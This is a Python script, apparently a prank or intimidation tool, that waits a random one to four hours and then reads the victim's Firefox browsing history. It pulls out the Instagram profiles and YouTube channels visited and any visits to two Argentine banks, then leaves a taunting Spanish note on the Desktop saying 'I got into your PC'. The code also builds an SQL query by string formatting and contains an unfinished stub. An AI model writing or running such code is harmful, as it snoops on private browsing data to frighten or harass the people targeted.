import os
from time import sleep
from random import randrange
import sqlite3
from pathlib import Path
import re

HACKER_FILE_NAME = "test"


def get_user_path():
    return "{}/".format(Path.home())


def delay_action():
    sleep_hours = randrange(1, 4)
    sleep_min = randrange(1, 60)

    print("Create the file in {}/h {}/m".format(sleep_hours, sleep_min))

    sleep(sleep_hours*3600+sleep_min*60)


def create_hacker_file(user_path):
    hacker_file = open(user_path + "Escritorio/" + HACKER_FILE_NAME + ".txt", "w")
    hacker_file.write("Hola, he entrado a tu PC.\n")
    return hacker_file


def get_steam_games(hacker_file, user_path):
    os.listdir()


def get_firefox_history(user_path):
    urls = None
    while not urls:
        try:
            history_path = user_path + ".mozilla/firefox/ybnj7uwn.default-release/places.sqlite"
            connection = sqlite3.connect(history_path)
            cursor = connection.cursor()
            cursor.execute("SELECT title, url FROM moz_places ORDER BY last_visit_date DESC")
            urls = cursor.fetchall()
            print(urls)
            connection.close()
            return urls

        except sqlite3.OperationalError:
            print("Historial inaccesible, reintentando en 3 segundos.")
            sleep(3)


def get_data_from_history_with_url(user_path, url):
    data = None
    while not data:
        history_path = user_path + ".mozilla/firefox/ybnj7uwn.default-release/places.sqlite"
        connection = sqlite3.connect(history_path)
        cursor = connection.cursor()
        cursor.execute("SELECT title, url FROM moz_places WHERE url='{}'".format(url))
        data = cursor.fetchall()
        connection.close()
        return data[0]


def check_instagram_profile(hacker_file, firefox_history):
    profiles_visited = []

    for i in firefox_history:
        results = re.findall("https://www.instagram.com/([A-Za-z0-9._]+)/$", i[1])
        if results and results[0] not in ["explore"]:
            profiles_visited.append(results[0])
    if profiles_visited:
        hacker_file.write(
            "Estaba viendo que has visto los perfiles de {} en Instagram...\n".format(", ".join(profiles_visited)))


def check_youtube_profile(user_path, hacker_file, firefox_history):
    profiles_visited = []
    profiles = []

    for i in firefox_history:
        results_channel_by_name = re.findall("https://www.youtube.com/c/[a-zA-Z-0-9]+$", i[1])
        results_channel_by_id = re.findall("https://www.youtube.com/channel/[a-zA-Z-0-9]+$", i[1])
        if results_channel_by_id:
            url_data = get_data_from_history_with_url(user_path, results_channel_by_id[0])
            profiles_visited.append(re.findall("([\s\w-]+) - YouTube", url_data[0]))
        if results_channel_by_name:
            url_data = get_data_from_history_with_url(user_path, results_channel_by_name[0])
            profiles_visited.append(re.findall("([\s\w-]+) - YouTube", url_data[0]))
    for profile in profiles_visited:
        profiles.append(profile[0])
    if profiles:
        hacker_file.write(
            "También has visto los canales de {} En YouTube, interesante...".format(", ".join(profiles)))


def check_bank_account(hacker_file, firefox_history):
    his_bank = None
    banks = ["Banco de la Nación Argentina", "Banco Provincia de Buenos Aires"]
    for i in firefox_history:
        for b in banks:
            if i[0] is not None and b.lower() in i[0].lower():
                his_bank = b
                break
        if his_bank:
            break
    if his_bank:
        hacker_file.write("¿Usas el banco {}?".format(his_bank))


def main():
    delay_action()
    user_path = get_user_path()
    hacker_file = create_hacker_file(user_path)
    firefox_history = get_firefox_history(user_path)

    check_instagram_profile(hacker_file, firefox_history)
    check_youtube_profile(user_path, hacker_file, firefox_history)
    check_bank_account(hacker_file, firefox_history)


if __name__ == "__main__":
    main()
